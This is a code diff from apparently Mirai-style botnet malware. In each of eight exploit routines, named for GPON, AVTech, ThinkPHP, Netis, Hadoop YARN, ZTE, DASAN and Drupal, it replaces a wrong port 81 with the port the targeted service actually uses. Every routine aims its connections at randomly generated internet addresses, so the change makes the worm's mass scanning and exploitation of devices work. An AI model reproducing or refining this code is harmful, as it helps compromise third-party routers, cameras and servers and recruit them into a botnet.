@@ -1297,7 +1297,7 @@ char *Gpon_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(443);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1328,7 +1328,7 @@ char *AVtech_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(80);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1359,7 +1359,7 @@ char *Thinkphp_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(8080);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1483,7 +1483,7 @@ char *Netis_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(53413);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1545,7 +1545,7 @@ char *Yarn_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(8088);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1576,7 +1576,7 @@ char *ZTE_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(8083);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1607,7 +1607,7 @@ char *DASAN_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(8080);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
@@ -1638,7 +1638,7 @@ char *DRUPAL2_Exploit(){
           conn[a].ip = ("");
 
           dest_addr.sin_family = AF_INET;
-          dest_addr.sin_port = htons(81);
+          dest_addr.sin_port = htons(80);
           dest_addr.sin_addr.s_addr = getRandomIP();
           memset(dest_addr.sin_zero, '/0', sizeof(dest_addr.sin_zero));
 
